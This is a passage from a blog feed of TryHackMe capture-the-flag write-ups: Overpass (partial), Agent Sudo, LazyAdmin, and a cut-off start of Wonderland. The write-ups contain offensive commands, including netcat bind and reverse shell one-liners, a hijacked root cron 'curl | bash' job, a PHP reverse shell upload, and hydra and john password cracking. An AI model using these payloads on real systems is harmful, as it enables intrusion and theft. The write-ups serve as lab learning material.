+&#x2F;downloads            (Status: 301) [Size: 0] [--&gt; downloads&#x2F;]
+&#x2F;aboutus              (Status: 301) [Size: 0] [--&gt; aboutus&#x2F;]
+&#x2F;admin                (Status: 301) [Size: 42] [--&gt; &#x2F;admin&#x2F;]
+&#x2F;css                  (Status: 301) [Size: 0] [--&gt; css&#x2F;]
+......
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We got admin as interesting and there is a login page.
+&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;admin_login_page.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;There is client side login logic found in &lt;code&gt;login.js&lt;&#x2F;code&gt;, the main script is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+async function login() {
+    const usernameBox = document.querySelector(&quot;#username&quot;);
+    const passwordBox = document.querySelector(&quot;#password&quot;);
+    const loginStatus = document.querySelector(&quot;#loginStatus&quot;);
+    loginStatus.textContent = &quot;&quot;
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData(&quot;&#x2F;api&#x2F;login&quot;, creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === &quot;Incorrect credentials&quot;) {
+        loginStatus.textContent = &quot;Incorrect Credentials&quot;
+        passwordBox.value=&quot;&quot;
+    } else {
+        Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
+        window.location = &quot;&#x2F;admin&quot;
+    }
+}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;It seems that, if the value of &lt;code&gt;statusOrCookie&lt;&#x2F;code&gt; is &lt;code&gt;Incorrect Credentials&lt;&#x2F;code&gt;, then the error occurs, otherwise log on. Lets try to tweak the variable &lt;code&gt;statusOrCookie&lt;&#x2F;code&gt;. May be directly hampring this pariable is difficult as this is from backend side. Instead we can set the cookies, as shown in else block to any value.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-attacking&quot;&gt;2. Attacking&lt;&#x2F;h2&gt;
+&lt;p&gt;Lets try in console, by inspecting the page. Did this and refrest, I got logged in ant there I found RSA private key.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;setting_cookies.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The message found there is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Welcome to the Overpass Administrator area
+A secure password manager with support for Windows, Linux, MacOS and more
+Since you keep forgetting your password, James, I&#x27;ve set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I&#x27;m tired of fixing stuff for you.
+Also, we really need to talk about this &quot;Military Grade&quot; encryption. - Paradox
+&lt;&#x2F;pre&gt;
+&lt;p&gt;That means we need to crack this key to get ssh password. We can use &lt;code&gt;ssh2john&lt;&#x2F;code&gt;. It converts ssh key into password hash and can be cracked using john. &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;ssh2john rsa_private_key &amp;gt; password_hash&lt;&#x2F;code&gt;, here rsa_private_key contains the private key found in the admin page after login.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt password_hash
+.........
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+jam****          (rsa_private_key)
+Warning: Only 2 candidates left, minimum 8 needed for performance.
+1g 0:00:00:06 DONE (2024-10-10 08:41) 0.1652g&#x2F;s 2370Kp&#x2F;s 2370Kc&#x2F;s 2370KC&#x2F;sa6_123..*7¡Vamos!
+Session completed
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have ssh password&#x2F;passphrase for the user &lt;code&gt;james&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;3-capture-the-flag&quot;&gt;3. Capture the flag&lt;&#x2F;h2&gt;
+&lt;p&gt;Login via ssh and capture the user flag as&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;user_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Here first, change the permission of the private key to &lt;code&gt;400&lt;&#x2F;code&gt; that means only the owner read the key. After that connect via ssh and provided passphrase to logged in, then found the &lt;code&gt;user.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;There is todo.txt is found, it is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+james@overpass-prod:~$ cat todo.txt 
+To Do:
+&gt; Update Overpass&#x27; Encryption, Muirland has been complaining that it&#x27;s not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don&#x27;t forget it.
+  Wait, we make a password manager. Why don&#x27;t I just use that?
+&gt; Test Overpass for macOS, it builds fine but I&#x27;m not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They&#x27;re not updating on the website
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;There is the mention of automated build script. Maybe this can be helpful, but we need to enumerate first.&lt;&#x2F;p&gt;
+&lt;p&gt;I have downloaded &lt;code&gt;linpeas.sh&lt;&#x2F;code&gt; into my local machine, created http server using python as &lt;code&gt;python -m http.server&lt;&#x2F;code&gt; then download the script in target machine and ran there.&lt;&#x2F;p&gt;
+&lt;p&gt;Importent finding can be &lt;code&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;code&gt; file is writable by every user including we. Also looking into cornjob&lt;&#x2F;p&gt;
+&lt;pre&gt;
+james@overpass-prod:~$ cat &#x2F;etc&#x2F;crontab 
+# &#x2F;etc&#x2F;crontab: system-wide crontab
+# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;
+# command to install the new version when you edit this file
+# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=&#x2F;bin&#x2F;sh
+PATH=&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly
+25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )
+47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )
+52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm&#x2F;downloads&#x2F;src&#x2F;buildscript.sh | bash
+&lt;&#x2F;pre&gt;
+&lt;p&gt;There is a script running by root, everytime and hosted in overpass.thm domain. So we need to setup payload in such a way that while running this job, our payload will be downloaded and runned so that the victim will be connected to out machine, using bind shell.&lt;&#x2F;p&gt;
+&lt;p&gt;For that need to setup server and path like this in my local device and need to add DNS record in &#x2F;etc&#x2F;hosts as shown below&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;10.17.58.84 overpass.thm&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;and the payload used in buildscript.sh is &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;mkfifo &#x2F;tmp&#x2F;f; nc -lvnp 4444 &amp;lt; &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh &amp;gt;&#x2F;tmp&#x2F;f 2&amp;gt;&amp;amp;1; rm &#x2F;tmp&#x2F;f&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Here we go, got root flag too.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;root_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Agent Sudo - TryHackMe Writup</title>
+        <published>2024-10-22T00:00:00+00:00</published>
+        <updated>2024-10-22T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/agent-sudo/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/agent-sudo/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;agent_sudo.png&quot; alt=&quot;Agent Sudo&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP: 10.10.165.175&lt;&#x2F;p&gt;
+&lt;p&gt;There are 3 ports are open.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;nmap 10.10.165.175 -v&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;
+PORT   STATE SERVICE
+21&#x2F;tcp open  ftp
+22&#x2F;tcp open  ssh
+80&#x2F;tcp open  http
+&lt;&#x2F;pre&gt;
+&lt;p&gt;The message shown in homepage, &lt;code&gt;http:&#x2F;&#x2F;10.10.165.175&#x2F;&lt;&#x2F;code&gt; is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;It seems need to use &lt;code&gt;user-agent&lt;&#x2F;code&gt; as codename. The codename is from A to Z maybe, as there is shown Agent R. For that i will use BurpSuite.&lt;&#x2F;p&gt;
+&lt;p&gt;I have inserted playod in &lt;code&gt;user-agent&lt;&#x2F;code&gt; from A to Z, and forwarded through intruder. &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;snipper_attack_burpsuite.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Response length for C and R are different, for C less and for R more. By analyzing I found R have much content as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+	
+Dear agents,
+Use your own &lt;b&gt;codename&lt;&#x2F;b&gt; as user-agent to access the site.
+
+From,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;But in case of C, there is status code &lt;code&gt;302&lt;&#x2F;code&gt; and the locetion is 
+&lt;code&gt;Location: agent_C_attention.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;response_user_agent_C.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now visit the location we found,&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;The agent name is &lt;code&gt;chris&lt;&#x2F;code&gt; and it says the password is weak.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-attack&quot;&gt;2. Attack&lt;&#x2F;h2&gt;
+&lt;p&gt;Lets try out password crack for user cheris in FTP.
+we will use hydra for attack and rockyou.txt for password list.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;hydra -l chris -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.165.175 ftp&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;ftp_password_attack_result.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After the successful login to FTP, we got &lt;&#x2F;p&gt;
+&lt;pre&gt;
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+&lt;&#x2F;pre&gt;
+&lt;p&gt;All the files are download by simply &lt;code&gt;get&lt;&#x2F;code&gt; command.&lt;&#x2F;p&gt;
+&lt;p&gt;The message says that the password is stored inside the image. So need to apply the concept to steganography.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#x27;t be a problem for you.
+
+From,
+Agent C
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now, using &lt;code&gt;binwalk&lt;&#x2F;code&gt; and getting info if found.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ binwalk cute-alien.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+❯ binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now extracting the cutie.png using &lt;code&gt;binwalk -e cutie.png&lt;&#x2F;code&gt; we have 365,  365.zlib and  8702.zip files, zip is important and is password protected.&lt;&#x2F;p&gt;
+&lt;p&gt;Using &lt;code&gt;John The Ripper&lt;&#x2F;code&gt; to crack this password. First creating hash by &lt;code&gt;zip2john 8702.zip &amp;gt; zip_pass.hash&lt;&#x2F;code&gt; and then cracking the hash as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt zip_pass.hash
+.............
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+ali**            (8702.zip&#x2F;To_agentR.txt)
+1g 0:00:00:00 DONE (2024-10-08 17:45) 1.162g&#x2F;s 28576p&#x2F;s 28576c&#x2F;s 28576C&#x2F;s christal..280789
+Session completed
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have zip password, extract it. The message found is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+Agent C,
+
+We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!
+
+By,
+Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Here &lt;code&gt;QXJlYTUx&lt;&#x2F;code&gt; is encoded, lets decode using base64 as &lt;&#x2F;p&gt;
+&lt;pre&gt;
+echo &#x27;QXJlYTUx&#x27; | base64 -d
+Area**
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now look into cute-alien.jpg, using &lt;code&gt;steghide&lt;&#x2F;code&gt;. After the command &lt;code&gt;steghide --info cute-alien.jpg&lt;&#x2F;code&gt;, we found that the &lt;code&gt;message.txt&lt;&#x2F;code&gt; file is embedded there.&lt;&#x2F;p&gt;
+&lt;p&gt;Extracting it using &lt;code&gt;steghide --extract -sf cute-alien.jpg&lt;&#x2F;code&gt;. The message is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ cat message.txt
+Hi jam**,
+
+Glad you find this message. Your login password is hacker******
+
+Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;3-capture-the-flag&quot;&gt;3. Capture the Flag&lt;&#x2F;h2&gt;
+&lt;p&gt;Here we got SSH username and password. Now connect to it as
+&lt;code&gt;ssh jam**@10.10.165.175&lt;&#x2F;code&gt;, got the user flag.
+&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;user_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;To know the incident of the photo &lt;code&gt;Alien_autospy.jpg&lt;&#x2F;code&gt; we need to download (maybe using scp) and search on google as&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;scp jam**@10.10.165.175:&#x2F;home&#x2F;jam**&#x2F;Alien_autospy.jpg .&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;By searching we found the image from &lt;code&gt;Roswell&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege Escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;Starting from &lt;code&gt;sudo -l&lt;&#x2F;code&gt;, found that user can run &#x2F;bin&#x2F;bash only as sudo. Now looking for sudo vulnerability for the version &lt;code&gt;1.8.21p2&lt;&#x2F;code&gt; (googling it.), we have CVE-2019-14***.&lt;&#x2F;p&gt;
+&lt;p&gt;The exploit is &lt;code&gt;sudo ***** &#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; (found in exploit-db) and we got&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;root_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Final message from Agent R is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+By,
+Des*** a.k.a Agent R
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>LazyAdmin - TryHackMe Writup</title>
+        <published>2024-10-22T00:00:00+00:00</published>
+        <updated>2024-10-22T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/lazy-admin/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/lazy-admin/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;lazy_admin.jpeg&quot; alt=&quot;LazyAdmin&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;Easy linux machine to practice your skills.&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;0-scanning&quot;&gt;0. Scanning&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP: 10.10.204.37&lt;&#x2F;p&gt;
+&lt;p&gt;2 ports are opened.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nmap -sV -Pn 10.10.204.37 -v
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2024-10-11 16:46 +0545
+........
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Enumerating port 80, we have default apache page. Now using gobuster to find out directories.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ gobuster dir -u http:&#x2F;&#x2F;10.10.204.37&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http:&#x2F;&#x2F;10.10.204.37&#x2F;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster&#x2F;3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+&#x2F;content              (Status: 301) [Size: 314] [--&gt; http:&#x2F;&#x2F;10.10.204.37&#x2F;content&#x2F;]
+.....
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Looking into &lt;code&gt;&#x2F;content&lt;&#x2F;code&gt; page, we have &lt;code&gt;SweetRice notice&lt;&#x2F;code&gt;, this is the website management system.&lt;&#x2F;p&gt;
+&lt;p&gt;Looking for the exploit, we have the result&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;exploit_result.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Looking into backup disclosure exploit, we have following information about the exploit &lt;&#x2F;p&gt;
+&lt;pre&gt;
+Title: SweetRice 1.5.1 - Backup Disclosure
+Application: SweetRice
+Versions Affected: 1.5.1
+Vendor URL: http:&#x2F;&#x2F;www.basic-cms.org&#x2F;
+Software URL: http:&#x2F;&#x2F;www.basic-cms.org&#x2F;attachment&#x2F;sweetrice-1.5.1.zip
+Discovered by: Ashiyane Digital Security Team
+Tested on: Windows 10
+Bugs: Backup Disclosure
+Date: 16-Sept-2016
+
+
+Proof of Concept :
+
+You can access to all mysql backup and download them from this directory.
+http:&#x2F;&#x2F;localhost&#x2F;inc&#x2F;mysql_backup
+
+and can access to website files backup from:
+http:&#x2F;&#x2F;localhost&#x2F;SweetRice-transfer.zip
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now looking into the mysql_backup dir, there is mysql backup. On the 79 th line of the file, we have what we needed for now, there is admin name and its password in hash format.&lt;&#x2F;p&gt;
+&lt;p&gt;Like &lt;code&gt;inc&lt;&#x2F;code&gt; dir we can have others too, so finding dir in &lt;code&gt;&#x2F;content&lt;&#x2F;code&gt;, we have &lt;code&gt;as&lt;&#x2F;code&gt; dir. This is the admin login page.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;admin_login.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-exploitation&quot;&gt;2. Exploitation&lt;&#x2F;h2&gt;
+&lt;p&gt;Break the earlier hash, and login with username and password.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+username: ma*****
+password hash: 42f749ade7f9e195bf475f**********
+password: Passw******
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Cracked using john, &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;john --format=raw-MD5 --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt password.hash&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We looged in into the admin panel.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;admin_panel_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;I&#x27;m using media center to upload the reverse shell exploit, provided by &lt;code&gt;pentestmonkey&lt;&#x2F;code&gt;. I changed IP address and uploaded there. Maybe need to change the extension, made &lt;code&gt;phtml&lt;&#x2F;code&gt; and the file uploaded there.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;3-gaining-access&quot;&gt;3. Gaining Access&lt;&#x2F;h2&gt;
+&lt;p&gt;Now setup nc listening on port &lt;code&gt;1234&lt;&#x2F;code&gt; in my host machine, and executing the exploit we will get the connection.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.204.37 37452
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU&#x2F;Linux
+ 14:57:51 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&#x2F;bin&#x2F;sh: 0: can&#x27;t access tty; job control turned off
+$ whoami
+www-data
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We got the user flag as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ ls &#x2F;home
+itguy
+$ ls &#x2F;home&#x2F;itguy
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+$ cat &#x2F;home&#x2F;itguy&#x2F;user.txt
+THM{63e5bce9271952aad1**************}
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege Escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;It seems we can run perl, and can be use sudo so this is a good chance to esclate privilege.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;perl &#x2F;home&#x2F;itguy&#x2F;backup.pl
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We have this code inside the &lt;code&gt;backup.pl&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ cat &#x2F;home&#x2F;itguy&#x2F;backup.pl
+#!&#x2F;usr&#x2F;bin&#x2F;perl
+
+system(&quot;sh&quot;, &quot;&#x2F;etc&#x2F;copy.sh&quot;);
+$ cat &#x2F;etc&#x2F;copy.sh
+rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;&#x2F;tmp&#x2F;f
+$ ls -l &#x2F;etc&#x2F;copy.sh
+
+-rw-r--rwx 1 root root 81 Nov 29  2019 &#x2F;etc&#x2F;copy.sh
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We have write permission to the file. Now need to change IP to my local IP, so that we can set the bind shell. Finally got connected to the target machine with user &lt;code&gt;root&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Alternatively spawn the shell, which would be the root shell as ran with sudo, shown below.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; &#x2F;etc&#x2F;copy.sh
+$ sudo &#x2F;usr&#x2F;bin&#x2F;perl &#x2F;home&#x2F;itguy&#x2F;backup.pl
+whoami
+root
+cat &#x2F;root&#x2F;root.txt
+THM{6637f41d0177b6f37cb20d**********}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Thats all, we got all the flags.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Wonderland - TryHackMe Writup</title>
+        <published>2024-10-22T00:00:00+00:00</published>
+        <updated>2024-10-22T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/wonderland/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/wonderland/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;wonderland.jpeg&quot; alt=&quot;overpass&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
